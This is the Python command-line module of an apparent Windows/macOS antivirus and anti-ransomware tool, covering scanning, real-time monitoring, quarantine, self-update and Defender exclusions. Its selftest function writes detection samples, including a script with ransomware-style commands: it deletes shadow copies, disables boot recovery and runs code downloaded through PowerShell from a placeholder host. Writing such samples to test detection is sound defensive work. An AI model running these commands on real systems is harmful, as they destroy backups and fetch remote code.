"""Command-line interface."""
from __future__ import annotations

import argparse
import os
import json
import sys
from pathlib import Path

import logging

from rich.progress import BarColumn, Progress, SpinnerColumn, TextColumn, TimeElapsedColumn

from . import __version__
from .config import load_config
from .elevation import ensure_admin, is_admin
from .utils import IS_WINDOWS
from .report import console, print_findings, write_json
from .utils import app_dir, setup_logging

_LOG = logging.getLogger("sentry.cli")
NEEDS_ADMIN = {"scan", "monitor", "service"}


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(prog="sentry", description="Sentry-AV: Windows/macOS antivirus + anti-ransomware")
    p.add_argument("--version", action="version", version=f"sentry-av {__version__}")
    p.add_argument("-v", "--verbose", action="store_true")
    p.add_argument("--no-elevate", action="store_true", help="do not try to gain admin/root")
    p.add_argument("--sudo", action="store_true",
                   help="macOS/Linux only: ask for root via sudo (password). Default is to run as the current user")
    p.add_argument("--config", type=Path, help="alternate config.json")
    sub = p.add_subparsers(dest="cmd", required=True)

    s = sub.add_parser("scan", help="scan files/folders for malware and ransomware artifacts")
    s.add_argument("paths", nargs="*", help="files or directories (default: quick-scan set)")
    s.add_argument("--full", action="store_true", help="scan whole system drive(s)")
    s.add_argument("--json", type=Path, help="write JSON report")
    s.add_argument("--quarantine", action="store_true", help="quarantine high/critical findings")
    s.add_argument("--min-severity", default="low", choices=["low", "medium", "high", "critical"])
    s.add_argument("--show-low", action="store_true", help="also list low-severity findings in the table")
    s.add_argument("--threads", type=int)

    m = sub.add_parser("monitor", help="real-time protection: watch, detect and kill ransomware")
    m.add_argument("paths", nargs="*", help="directories to watch (default: user folders)")
    m.add_argument("--aggressive", action="store_true", help="kill medium-confidence suspects too")
    m.add_argument("--no-canary", action="store_true", help="do not place decoy files")
    m.add_argument("--dry-run", action="store_true", help="detect and log, never kill")

    q = sub.add_parser("quarantine", help="manage quarantined files")
    qs = q.add_subparsers(dest="qcmd", required=True)
    qs.add_parser("list")
    r = qs.add_parser("restore"); r.add_argument("id"); r.add_argument("--to")
    d = qs.add_parser("delete"); d.add_argument("id")
    qs.add_parser("purge")

    u = sub.add_parser("update", help="download malware-hash signatures from the public feeds")
    u.add_argument("--full", action="store_true", help="also (re)build the full MalwareBazaar index (~45 MB download)")

    up = sub.add_parser("upgrade", help="update this program to the latest GitHub release")
    up.add_argument("--check", action="store_true", help="only report whether a newer version exists")
    up.add_argument("--yes", "-y", action="store_true", help="install without asking")

    w = sub.add_parser("whitelist", help="trusted processes / paths")
    ws = w.add_subparsers(dest="wcmd", required=True)
    ws.add_parser("list")
    wa = ws.add_parser("add"); wa.add_argument("value", help="process name (foo.exe) or path prefix")
    wr = ws.add_parser("remove"); wr.add_argument("value")

    ins = sub.add_parser("install", help="copy this exe to a dedicated folder + shortcuts (+ Defender exclusion on Windows)")
    ins.add_argument("--dir", help="install folder (default: per-user app folder)")
    ins.add_argument("--no-desktop", action="store_true", help="do not create a Desktop shortcut")
    ins.add_argument("--no-start-menu", action="store_true", help="do not create a Start-menu shortcut")
    ins.add_argument("--no-defender", action="store_true", help="do not add the Windows Defender exclusion")
    ins.add_argument("--no-launch", action="store_true", help="do not start the installed copy afterwards")
    uns = sub.add_parser("uninstall", help="remove shortcuts, Defender exclusion and the installed exe")
    uns.add_argument("--dir", help="install folder to remove from")

    sv = sub.add_parser("service", help="install real-time monitor as a boot/logon service")
    sv.add_argument("action", choices=["install", "uninstall", "status"])

    df = sub.add_parser("defender", help="Windows Defender exclusions for the install/data folders (Windows only)")
    df.add_argument("action", choices=["status", "exclude", "remove"])

    sub.add_parser("status", help="show configuration, signature counts and incidents")
    st = sub.add_parser("selftest", help="create harmless test samples and scan them")
    st.add_argument("--keep", action="store_true")
    return p


_MENU = [
    ("빠른 검사 (사용자 폴더·임시 폴더)", ["scan"]),
    ("전체 디스크 검사", ["scan", "--full"]),
    ("실시간 보호 시작 (랜섬웨어 차단, Ctrl+C 로 종료)", ["monitor"]),
    ("실시간 보호를 부팅 시 자동 실행으로 등록", ["service", "install"]),
    ("자동 실행 해제", ["service", "uninstall"]),
    ("격리된 파일 목록", ["quarantine", "list"]),
    ("상태 / 설정 보기", ["status"]),
    ("자가 진단 (무해한 테스트 샘플 검사)", ["selftest"]),
    ("Windows Defender 예외 등록 (업데이트가 계속 삭제될 때, 관리자 권한)", ["defender", "exclude"]),
    ("전용 폴더에 설치 (바로가기 생성, 권장)", ["install"]),
]


def interactive_menu(cfg=None) -> list[str] | None:
    """Shown when launched without arguments (e.g. double-clicked). Returns argv or None to quit."""
    console.print(f"[bold]Sentry-AV {__version__}[/]  Windows/macOS 백신 + 랜섬웨어 차단")
    if cfg is not None:
        if _first_run_install_wizard():
            return None          # installed + launched the new copy; this instance is done
        _startup_update_check(cfg)
    console.print()
    for i, (label, _) in enumerate(_MENU, 1):
        console.print(f"  [cyan]{i}[/]. {label}")
    console.print("  [cyan]0[/]. 종료\n")
    while True:
        try:
            choice = input("번호를 입력하세요: ").strip()
        except (EOFError, KeyboardInterrupt):
            _wait_for_full_feed()
            return None
        if choice in ("0", "q", ""):
            _wait_for_full_feed()
            return None
        if choice.isdigit() and 1 <= int(choice) <= len(_MENU):
            return list(_MENU[int(choice) - 1][1])
        console.print("[yellow]잘못된 번호입니다.[/]")


def _first_run_install_wizard() -> bool:
    """When the exe is run from Downloads/Desktop (a broad folder), offer to install it into
    a dedicated folder first.  Returns True when it installed and launched the new copy."""
    from . import installer
    if not installer.running_from_broad_dir() or not sys.stdin.isatty():
        return False
    dest = installer.default_install_dir()
    console.print(f"[yellow]현재 다운로드/바탕화면 등에서 실행 중입니다.[/] 이 위치에서는 업데이트 시 "
                  "백신이 파일을 지울 수 있습니다.\n"
                  f"전용 폴더에 설치하는 것을 권장합니다: [bold]{dest}[/]")
    if IS_WINDOWS:
        console.print("  설치하면 바탕화면·시작 메뉴 바로가기를 만들고, Defender 예외(파일 하나)를 등록합니다.")
    try:
        ans = input("지금 설치할까요? [Y/n] ").strip().lower()
    except (EOFError, KeyboardInterrupt):
        return False
    if ans not in ("", "y", "yes"):
        console.print("[dim]설치를 건너뜁니다. 나중에 메뉴의 '설치' 또는 `sentry install` 로 설치할 수 있습니다.[/]")
        return False
    rc = main(["install"])
    return rc == 0


def _startup_update_check(cfg, timeout: float = 8.0) -> None:
    """Interactive start: ask GitHub for the latest release right away.  If it is newer,
    offer to install it (Enter = yes); 'n' goes on to the menu.  Network trouble just
    prints one line and continues - the menu must never be blocked by the updater."""
    from .selfupdate import Updater, load_state, relaunch
    from .utils import is_frozen
    up = Updater(cfg)
    up.cleanup_backup()                  # <exe>.old left by the update we just restarted from
    if not cfg.get("auto_update", True):
        return
    up.gh.timeout = timeout
    with console.status("업데이트 확인 중..."):
        rel = up.check()
    if rel is None:
        err = load_state().get("last_error") or ""
        console.print(f"[dim]업데이트 확인 실패{(': ' + err[:80]) if err else ''} - 나중에 다시 시도합니다[/]")
        return
    if not rel.newer:
        console.print(f"[dim]최신 버전입니다 (릴리스 {rel.tag})[/]")
        _refresh_signatures(cfg)
        return
    console.print(f"[yellow]새 버전 {rel.version} 이(가) 있습니다[/] (현재 {__version__})  {rel.html_url}")
    if not is_frozen():
        console.print("[dim]소스에서 실행 중: `git pull` 로 갱신하세요[/]")
        return
    try:
        answer = input("지금 업데이트할까요? [Y/n] ").strip().lower()
    except (EOFError, KeyboardInterrupt):
        return
    if answer not in ("", "y", "yes"):
        console.print("[dim]건너뜁니다. 나중에 `sentry upgrade` 로 설치할 수 있습니다[/]")
        return
    if _download_and_install(up, rel):
        console.print("새 버전을 시작합니다...")
        if not relaunch([a for a in sys.argv[1:]]):
            console.print(f"[red]새 버전을 시작하지 못했습니다.[/] 파일은 교체되었으니 {up.exe} 를 직접 다시 실행하세요. "
                          "Windows 보안의 '보호 기록' 에 차단 항목이 있는지 확인하세요.")


def _refresh_signatures(cfg, force: bool = False, quiet: bool = False) -> None:
    """Daily: pull the small recent feeds (foreground, a second or two).  Weekly: rebuild the
    full MalwareBazaar index in a background thread (~45 MB) so the menu is never blocked."""
    import threading
    from . import updater
    if force or updater.signatures_due(float(cfg.get("update_check_interval_hours", 24))):
        try:
            with console.status("바이러스 시그니처 갱신 중..."):
                res = updater.update_signatures(cfg.signature_urls)
            ok = sum(1 for v in res["feeds"].values() if v.startswith("ok"))
            if not quiet:
                console.print(f"[dim]시그니처 +{res['added']} (총 {res['total']:,}, 피드 {ok}/{len(res['feeds'])})[/]")
        except Exception as e:  # noqa: BLE001
            if not quiet:
                console.print(f"[dim]시그니처 갱신 실패: {e}[/]")
    days = float(cfg.get("signature_full_days", 7) or 0)
    url = cfg.get("signature_full_url")
    if url and days > 0 and updater.full_due(days):
        if not quiet:
            console.print("[dim]전체 해시 DB(약 45MB)를 백그라운드에서 내려받습니다. 끝나면 다음 검사부터 적용됩니다.[/]")

        def _run():
            try:
                res = updater.update_full(url)
                _LOG.info("full hash index rebuilt: %d hashes", res["count"])
            except Exception as e:  # noqa: BLE001
                _LOG.warning("full hash index update failed: %s", e)

        global _FULL_FEED_THREAD
        _FULL_FEED_THREAD = threading.Thread(target=_run, name="sentry-full-feed", daemon=True)
        _FULL_FEED_THREAD.start()


_FULL_FEED_THREAD = None


def _wait_for_full_feed() -> None:
    """Menu exit: do not kill a half-done full-dump download; let it finish (Ctrl+C skips)."""
    t = _FULL_FEED_THREAD
    if t is None or not t.is_alive():
        return
    try:
        with console.status("전체 해시 DB 내려받는 중... (Ctrl+C 로 건너뛰면 다음에 다시 받습니다)"):
            while t.is_alive():
                t.join(0.5)
    except KeyboardInterrupt:
        console.print("[dim]건너뜁니다[/]")


def _offer_defender_exclusion() -> bool:
    """Blocked update on Windows: explain, ask (default No), register the exclusion with a UAC
    prompt, and return True when it was added so the caller can retry."""
    from . import defender
    from .elevation import is_admin, run_elevated_and_wait
    from .utils import self_command
    if not IS_WINDOWS or not sys.stdin.isatty():
        return False
    if defender.install_dir_is_broad():
        console.print(f"[yellow]실행 파일이 공용 폴더에 있습니다:[/] {defender.install_dir()}\n"
                      "다운로드·바탕화면은 백신 예외로 두면 위험하므로, exe 를 전용 폴더(예: C:\\Sentry-AV)로 "
                      "옮긴 뒤 다시 실행해 주세요.")
        return False
    console.print("[yellow]Windows Defender 가 새 실행 파일을 삭제한 것으로 보입니다.[/] "
                  "보호 기록에서 '허용' 해도 업데이트마다 새 파일이 다시 차단됩니다.\n"
                  f"이 exe 파일과 데이터 폴더만 Defender 예외에 등록합니다 (폴더 전체가 아님):\n  "
                  + "\n  ".join(defender.exclusion_paths()))
    try:
        if input("지금 예외로 등록할까요? (관리자 권한 창이 뜹니다) [y/N] ").strip().lower() not in ("y", "yes"):
            return False
    except (EOFError, KeyboardInterrupt):
        return False
    try:
        if is_admin():
            console.print(defender.add_exclusions())
            return True
        rc = run_elevated_and_wait([*self_command(), "--no-elevate", "defender", "exclude"])
        if rc == 0:
            console.print("[green]예외를 등록했습니다.[/]")
            return True
        console.print("[red]예외 등록이 취소되었거나 실패했습니다.[/]")
        return False
    except RuntimeError as e:
        console.print(f"[red]등록 실패:[/] {e}")
        return False


def _download_and_install(up, rel) -> bool:
    """Download + verify + swap the executable with a progress bar.  False on failure (printed)."""
    with Progress(SpinnerColumn(), TextColumn("{task.description}"), BarColumn(bar_width=None),
                  TimeElapsedColumn(), console=console, transient=True) as prog:
        task = prog.add_task(f"downloading {rel.tag}", total=None)

        def on_progress(done, total):
            prog.update(task, completed=done, total=total or None)

        try:
            path = up.install(up.download(rel, on_progress))
        except Exception as e:  # noqa: BLE001
            console.print(f"[red]업데이트 실패:[/] {e}")
            if IS_WINDOWS and "시작할 수 없어" in str(e):
                if _offer_defender_exclusion():
                    console.print("다시 시도합니다...")
                    try:
                        path = up.install(up.download(rel, on_progress))
                    except Exception as e2:  # noqa: BLE001
                        console.print(f"[red]업데이트 실패:[/] {e2}")
                        return False
                    console.print(f"[bold green]업데이트 완료[/] {__version__} → {rel.version}  ({path})")
                    return True
            return False
    console.print(f"[bold green]업데이트 완료[/] {__version__} → {rel.version}  ({path})")
    return True


def _background_update_check(cfg) -> None:
    """Throttled (once per update_check_interval_hours) GitHub check in a daemon thread;
    never blocks or fails the command that triggered it."""
    import threading
    from .selfupdate import Updater, check_due
    if not check_due(float(cfg.get("update_check_interval_hours", 24))):
        return

    def _run():
        try:
            rel = Updater(cfg).check()
            if rel and rel.newer:
                console.print(f"[yellow]새 버전 {rel.version} 이(가) 있습니다: `sentry upgrade` 로 설치[/]")
        except Exception:  # noqa: BLE001
            pass
        try:
            from . import updater
            if updater.signatures_due(float(cfg.get("update_check_interval_hours", 24))):
                updater.update_signatures(cfg.signature_urls)
        except Exception:  # noqa: BLE001
            pass

    threading.Thread(target=_run, name="sentry-update-check", daemon=True).start()


def _owns_console() -> bool:
    """Windows: True when this program is the only thing in its console window
    (started by double-click), so the window would vanish the moment we exit."""
    if not IS_WINDOWS:
        return True
    try:
        import ctypes
        buf = (ctypes.c_uint * 16)()
        n = ctypes.windll.kernel32.GetConsoleProcessList(buf, 16)  # type: ignore[attr-defined]
        return n <= 2          # PyInstaller one-file = bootloader + child; a parent cmd/PowerShell makes 3+
    except Exception:  # noqa: BLE001
        return True


def _close_terminal_window_later() -> None:
    """macOS: Terminal keeps a '[Process completed]' window after a Finder-launched
    program exits.  Spawn a detached helper that waits for our shell to finish and
    closes that window - but only if nothing else (an interactive shell) is left in it."""
    from .utils import IS_MACOS
    if not IS_MACOS or os.environ.get("TERM_PROGRAM") != "Apple_Terminal":
        return
    try:
        tty = os.ttyname(sys.stdin.fileno())
    except OSError:
        return
    # the login shell saves its session history before exiting, which can take a few
    # seconds; poll until the tab is empty, then close it (never while a shell is alive)
    script = f'''
repeat 20 times
  delay 0.5
  tell application "Terminal"
    repeat with w in windows
      try
        repeat with t in tabs of w
          if tty of t is "{tty}" and (count of processes of t) is 0 then
            if (count of tabs of w) is 1 then close w
            return
          end if
        end repeat
      end try
    end repeat
  end tell
end repeat'''
    try:
        import subprocess
        subprocess.Popen(["osascript", "-e", script], stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
                         stderr=subprocess.DEVNULL, start_new_session=True)
    except OSError:
        pass


def _pause_if_double_clicked() -> None:
    """Keep the terminal window open when we were started from Finder/Explorer, then close it."""
    if not sys.stdin.isatty() or not _owns_console():
        return
    try:
        input("\n엔터를 누르면 창이 닫힙니다...")
    except (EOFError, KeyboardInterrupt):
        pass
    _close_terminal_window_later()


def _only_global_opts(argv: list[str]) -> bool:
    """True when no sub-command was given (only -v / --no-elevate / --sudo / --config X, or nothing)."""
    i = 0
    while i < len(argv):
        a = argv[i]
        if a in ("-v", "--verbose", "--no-elevate", "--sudo"):
            i += 1
        elif a == "--config" and i + 1 < len(argv):
            i += 2
        else:
            return False
    return True


def main(argv: list[str] | None = None) -> int:
    argv = sys.argv[1:] if argv is None else argv
    if _only_global_opts(argv):
        if not sys.stdin.isatty():
            build_parser().print_help()
            return 2
        cfg_path = Path(argv[argv.index("--config") + 1]) if "--config" in argv else None
        chosen = interactive_menu(load_config(cfg_path))
        if chosen is None:
            return 0
        rc = main([*argv, *chosen])
        _pause_if_double_clicked()
        return rc
    args = build_parser().parse_args(argv)
    setup_logging(args.verbose, app_dir() / "sentry.log")
    cfg = load_config(args.config)

    if args.cmd != "upgrade":
        from .selfupdate import Updater
        Updater(cfg).cleanup_backup()          # <exe>.old left by a previous self-update
        _background_update_check(cfg)

    _wants_admin = args.cmd in NEEDS_ADMIN or (
        args.cmd == "defender" and getattr(args, "action", None) in ("exclude", "remove"))
    if _wants_admin and not args.no_elevate and not is_admin():
        ensure_admin(argv, use_sudo=args.sudo)

    if not is_admin() and args.cmd in NEEDS_ADMIN:
        msg = "사용자 권한 모드: 내 계정의 프로세스와 파일은 보호되지만, 다른 사용자/시스템 프로세스는 제어할 수 없습니다."
        if not IS_WINDOWS:
            msg += " (루트가 필요하면 --sudo)"
        console.print(f"[yellow]{msg}[/]")

    return {
        "scan": cmd_scan, "monitor": cmd_monitor, "quarantine": cmd_quarantine, "update": cmd_update,
        "upgrade": cmd_upgrade, "defender": cmd_defender, "install": cmd_install, "uninstall": cmd_uninstall,
        "whitelist": cmd_whitelist, "service": cmd_service, "status": cmd_status, "selftest": cmd_selftest,
    }[args.cmd](args, cfg)


# ---------------------------------------------------------------------------
def cmd_scan(args, cfg) -> int:
    from .quarantine import Quarantine
    from .scanner import Scanner
    from .utils import IS_WINDOWS
    from .whitelist import Whitelist

    if args.threads:
        cfg.set("scan_threads", args.threads)
    if args.full:
        roots = ["C:\\"] if IS_WINDOWS else ["/"]
        if IS_WINDOWS:
            import string, os
            roots = [f"{d}:\\" for d in string.ascii_uppercase if os.path.exists(f"{d}:\\")]
    else:
        roots = args.paths or cfg.quick_scan_paths
    scanner = Scanner(cfg, Whitelist(cfg))
    console.print(f"[bold]Sentry-AV[/] scanning {len(roots)} root(s) with {scanner.threads} threads "
                  f"(hashes={scanner.sigdb.stats()['hashes']}, yara={'on' if scanner.yara.available else 'off'})")
    with Progress(SpinnerColumn(), TextColumn("{task.description}"), BarColumn(bar_width=None),
                  TextColumn("{task.completed} files"), TimeElapsedColumn(), console=console, transient=True) as prog:
        task = prog.add_task("scanning", total=None)

        def on_progress(path, stats):
            short = path if len(path) < 70 else "…" + path[-69:]
            prog.update(task, completed=stats.files_scanned, description=short)

        try:
            findings, stats = scanner.scan_paths(roots, on_progress, min_severity=args.min_severity)
        except KeyboardInterrupt:
            scanner.stop()
            console.print("[yellow]interrupted[/]")
            return 130
    print_findings(findings, stats, roots, show_low=args.show_low, suppressed=scanner.suppressed_signed)
    report_path = args.json
    if report_path is None:
        import time as _time
        rdir = app_dir() / "reports"
        rdir.mkdir(parents=True, exist_ok=True)
        report_path = rdir / f"scan-{_time.strftime('%Y%m%d-%H%M%S')}.json"
    write_json(findings, stats, roots, report_path)
    console.print(f"JSON report: {report_path}")
    if args.quarantine:
        q = Quarantine()
        n = 0
        for f in findings:
            if f.severity in ("high", "critical"):
                if q.add(f.path, f"{f.category}: {'; '.join(f.reasons)[:200]}", f.sha256):
                    n += 1
        console.print(f"quarantined {n} file(s) -> {q.dir}")
    return 2 if any(f.severity in ("high", "critical") for f in findings) else 0


def cmd_monitor(args, cfg) -> int:
    from .realtime import RealtimeMonitor
    mon = RealtimeMonitor(cfg, paths=args.paths or None, canary=not args.no_canary,
                          dry_run=args.dry_run, aggressive=args.aggressive or None)
    console.print(f"[bold green]Sentry-AV real-time protection[/]  watching: {', '.join(mon.paths)}")
    console.print(f"canaries={'on' if mon.canary_enabled else 'off'}  aggressive={cfg.get('aggressive')}  "
                  f"dry_run={args.dry_run}  incidents -> {mon.responder.incident_log}   (Ctrl+C to stop)")
    from .utils import is_frozen
    auto = None
    if cfg.get("auto_update", True) and is_frozen():
        from .selfupdate import AutoUpdateThread, relaunch
        installed = {}

        def _on_installed(rel):
            installed["rel"] = rel
            mon.request_stop()

        auto = AutoUpdateThread(cfg, _on_installed)
        auto.start()
    mon.run_forever()
    if auto:
        auto.stop()
        if installed.get("rel"):
            console.print(f"[bold green]새 버전 {installed['rel'].version} 설치됨, 실시간 보호를 다시 시작합니다[/]")
            relaunch()
    return 0


def cmd_quarantine(args, cfg) -> int:
    from .quarantine import Quarantine
    from rich.table import Table
    q = Quarantine()
    if args.qcmd == "list":
        rows = q.list()
        if not rows:
            console.print("quarantine is empty")
            return 0
        t = Table()
        for c in ("id", "time", "original_path", "reason"):
            t.add_column(c, overflow="fold")
        for r in rows:
            t.add_row(r["id"], r["time"], r["original_path"], r["reason"])
        console.print(t)
    elif args.qcmd == "restore":
        console.print(f"restored to {q.restore(args.id, args.to)}")
    elif args.qcmd == "delete":
        q.delete(args.id); console.print("deleted")
    elif args.qcmd == "purge":
        console.print(f"purged {q.purge()} item(s)")
    return 0


def cmd_update(args, cfg) -> int:
    from . import updater
    res = updater.update_signatures(cfg.signature_urls)
    console.print_json(json.dumps(res, ensure_ascii=False))
    rc = 0 if any(v.startswith("ok") for v in res["feeds"].values()) else 1
    url = cfg.get("signature_full_url")
    if url and (args.full or not updater.full_index_path().exists()):
        with Progress(SpinnerColumn(), TextColumn("{task.description}"), BarColumn(bar_width=None),
                      TimeElapsedColumn(), console=console, transient=True) as prog:
            task = prog.add_task("downloading full hash dump", total=None)
            try:
                full = updater.update_full(url, progress=lambda d, t: prog.update(task, completed=d, total=t or None))
            except Exception as e:  # noqa: BLE001
                console.print(f"[red]full hash index failed:[/] {e}")
                return 1
        console.print(f"full hash index: {full['count']:,} hashes ({full['bytes'] / 1e6:.1f} MB) -> {full['file']}")
    return rc


def cmd_upgrade(args, cfg) -> int:
    from .selfupdate import Updater, load_state, relaunch
    from .utils import is_frozen
    up = Updater(cfg)
    console.print(f"현재 버전 {__version__}, GitHub {up.repo} 의 최신 릴리스를 확인합니다...")
    rel = up.check()
    if rel is None:
        err = load_state().get("last_error") or ""
        console.print("[red]릴리스 정보를 가져오지 못했습니다.[/] " + (f"({err})" if err else "")
                      + "\n비공개 저장소라면 config.json 의 update_token 또는 SENTRY_GITHUB_TOKEN 이 필요합니다.")
        return 1
    if not rel.newer:
        console.print(f"[green]최신 버전입니다.[/] (릴리스 {rel.tag})")
        return 0
    console.print(f"[yellow]새 버전 {rel.version} 이(가) 있습니다[/]  {rel.html_url}")
    if rel.notes.strip():
        console.print(rel.notes.strip()[:1500])
    if args.check:
        return 3
    if not is_frozen():
        console.print("[yellow]소스에서 실행 중입니다. `git pull` 로 갱신하세요.[/]")
        return 3
    if not args.yes and sys.stdin.isatty():
        try:
            if input("지금 설치할까요? [Y/n] ").strip().lower() not in ("", "y", "yes"):
                return 3
        except (EOFError, KeyboardInterrupt):
            return 3
    if not _download_and_install(up, rel):
        return 1
    if sys.stdin.isatty():
        try:
            if input("새 버전을 지금 실행할까요? [Y/n] ").strip().lower() in ("", "y", "yes"):
                if not relaunch(["--no-elevate"] if "--no-elevate" in sys.argv else []):
                    console.print(f"[red]새 버전을 시작하지 못했습니다.[/] {up.exe} 를 직접 다시 실행하세요.")
        except (EOFError, KeyboardInterrupt):
            pass
    return 0


def cmd_whitelist(args, cfg) -> int:
    from .whitelist import Whitelist
    if args.wcmd == "list":
        console.print_json(json.dumps(Whitelist(cfg).describe(), ensure_ascii=False))
        return 0
    key = "whitelist_path_prefixes" if ("/" in args.value or "\\" in args.value) else "whitelist_process_names"
    lst = list(cfg.get(key, []))
    if args.wcmd == "add" and args.value not in lst:
        lst.append(args.value)
    elif args.wcmd == "remove" and args.value in lst:
        lst.remove(args.value)
    cfg.set(key, lst)
    cfg.save()
    console.print(f"{key} = {lst}")
    return 0


def cmd_service(args, cfg) -> int:
    from . import service
    try:
        if args.action == "install":
            cfg.save()  # persist resolved absolute paths for the daemon
            console.print(service.install())
            if IS_WINDOWS:
                from . import defender
                if not all(defender.status().values()):
                    console.print("[dim]Windows Defender 가 업데이트된 exe 를 지우는 일이 있으면 `sentry defender exclude` 로 "
                                  "설치·데이터 폴더를 예외에 등록하세요.[/]")
        elif args.action == "uninstall":
            console.print(service.uninstall())
        else:
            console.print(service.status())
    except RuntimeError as e:
        console.print(f"[red]{e}[/]")
        return 1
    return 0


def cmd_install(args, cfg) -> int:
    from pathlib import Path as _P
    from . import installer
    from .elevation import is_admin, run_elevated_and_wait
    try:
        res = installer.install(_P(args.dir) if args.dir else None,
                                desktop=not args.no_desktop, start_menu=not args.no_start_menu,
                                exclude_defender=is_admin() and not args.no_defender)
    except RuntimeError as e:
        console.print(f"[red]설치 실패:[/] {e}")
        return 1
    console.print(f"[bold green]설치 완료[/] {res.exe}")
    if res.desktop_shortcut:
        console.print(f"  바탕화면 바로가기: {res.desktop_shortcut}")
    if res.startmenu_shortcut:
        console.print(f"  시작 메뉴: {res.startmenu_shortcut}")
    for n in res.notes:
        console.print(f"  {n}")
    if IS_WINDOWS and not args.no_defender and not is_admin():
        console.print("Windows Defender 예외를 등록합니다 (관리자 권한 창이 뜹니다)...")
        rc = run_elevated_and_wait([str(res.exe), "--no-elevate", "defender", "exclude"])
        console.print("  Defender 예외 등록됨" if rc == 0 else "  [yellow]Defender 예외 등록을 건너뛰었습니다 (나중에 `sentry defender exclude`)[/]")
    elif IS_WINDOWS and res.defender:
        console.print(f"  {res.defender}")
    if not args.no_launch and sys.stdin.isatty():
        from .selfupdate import relaunch
        try:
            if input("설치한 버전을 지금 실행할까요? [Y/n] ").strip().lower() in ("", "y", "yes"):
                import subprocess
                subprocess.Popen([str(res.exe)], cwd=str(res.exe.parent))
        except (EOFError, KeyboardInterrupt):
            pass
    return 0


def cmd_uninstall(args, cfg) -> int:
    from pathlib import Path as _P
    from . import installer
    removed = installer.uninstall(_P(args.dir) if args.dir else None)
    if removed:
        console.print("제거함:\n  " + "\n  ".join(removed))
    else:
        console.print("제거할 항목이 없습니다.")
    return 0


def cmd_defender(args, cfg) -> int:
    from . import defender
    try:
        if args.action == "exclude":
            console.print(defender.add_exclusions())
        elif args.action == "remove":
            console.print(defender.remove_exclusions())
        else:
            console.print_json(json.dumps(defender.status(), ensure_ascii=False))
    except RuntimeError as e:
        console.print(f"[red]{e}[/]")
        return 1
    return 0


def cmd_status(args, cfg) -> int:
    from .selfupdate import load_state
    from .scanner.signatures import SignatureDB
    from .scanner.yara_engine import YaraEngine
    from .quarantine import Quarantine
    from . import service
    inc = app_dir() / "incidents.jsonl"
    n_inc = sum(1 for _ in open(inc, encoding="utf-8")) if inc.exists() else 0
    info = {
        "version": __version__, "admin": is_admin(), "config": str(cfg.path), "app_dir": str(app_dir()),
        "signatures": SignatureDB().stats(), "yara": YaraEngine().available,
        "signature_updates": {k: v for k, v in load_state().items() if k.endswith("_at") or k == "full_count"},
        "quarantine_items": len(Quarantine().list()), "incidents": n_inc, "service": service.status(),
        "monitor_paths": cfg.monitor_paths, "quick_scan_paths": cfg.quick_scan_paths,
    }
    console.print_json(json.dumps(info, ensure_ascii=False))
    return 0


def cmd_selftest(args, cfg) -> int:
    """Create harmless samples that *look* like threats and scan them."""
    import os, tempfile
    from .scanner import Scanner
    from .whitelist import Whitelist
    d = Path(tempfile.mkdtemp(prefix="sentry-selftest-"))
    eicar = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"
    (d / "eicar.com").write_text(eicar)
    (d / "HOW_TO_DECRYPT_FILES.txt").write_text(
        "All your files have been encrypted! To decrypt your files you must buy our decryption key with bitcoin. "
        "Contact us via tor browser at xxxx.onion within 72 hours.")
    (d / "photo.jpg.locked").write_bytes(os.urandom(4096))
    (d / "report.pdf").write_bytes(os.urandom(4096))
    (d / "setup.ps1").write_text(
        "powershell -nop -w hidden -enc " + "A" * 60 + "\nvssadmin delete shadows /all /quiet\n"
        "bcdedit /set {default} recoveryenabled no\nIEX (New-Object Net.WebClient).DownloadString('http://x/y')")
    (d / "clean.txt").write_text("hello world\n" * 50)
    findings, stats = Scanner(cfg, Whitelist(cfg)).scan_paths([str(d)])
    print_findings(findings, stats, [str(d)])
    expected = {"eicar.com", "HOW_TO_DECRYPT_FILES.txt", "photo.jpg.locked", "report.pdf", "setup.ps1"}
    got = {Path(f.path).name for f in findings}
    ok = expected <= got and "clean.txt" not in got
    console.print("[bold green]SELFTEST PASSED[/]" if ok else f"[bold red]SELFTEST FAILED[/] missing={expected - got} extra={got - expected}")
    if not args.keep:
        import shutil
        shutil.rmtree(d, ignore_errors=True)
    return 0 if ok else 1
